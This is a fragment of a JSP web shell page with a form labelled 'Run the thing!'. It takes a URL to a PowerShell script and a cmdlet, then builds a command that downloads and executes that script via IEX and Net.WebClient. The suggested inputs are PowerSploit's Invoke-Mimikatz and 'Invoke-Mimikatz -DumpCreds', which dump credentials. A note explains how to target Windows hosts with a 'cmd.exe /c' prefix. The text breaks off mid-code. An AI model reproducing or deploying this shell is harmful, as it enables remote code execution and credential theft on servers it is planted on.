...
If you use this against a Windows box you may need to prefix your command with <i>cmd.exe /c</i>
</FORM>
<FORM METHOD="GET" NAME="myform2" ACTION="">
<INPUT TYPE="text" name="mimilink">URL<br/>
<INPUT TYPE="text" name="pscmdlet">CMD<br/>
<INPUT TYPE="submit" name="auto" VALUE="Run the thing!"><br/>
<b>URL</b> to the powershell file (e.g. <i>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</i>)
<br><b>CMD</b> the powershell cmdlet to run (e.g. <i>Invoke-Mimikatz -DumpCreds</i>)
</FORM>
<pre>
<%
...
if (request.getParameter("mimilink") != null) {
	...
	out.println("Retrieving and Running your PowerShell payload, be patient.<BR>");		
	out.println("The command that will be executed is<br>");
	String mimicmd = path + " -NonInteractive -Command \"IEX (New-Object Net.WebClient).DownloadString(\'" + request.getParameter("mimilink") + "\'); " + request.getParameter("pscmdlet") + "\"";
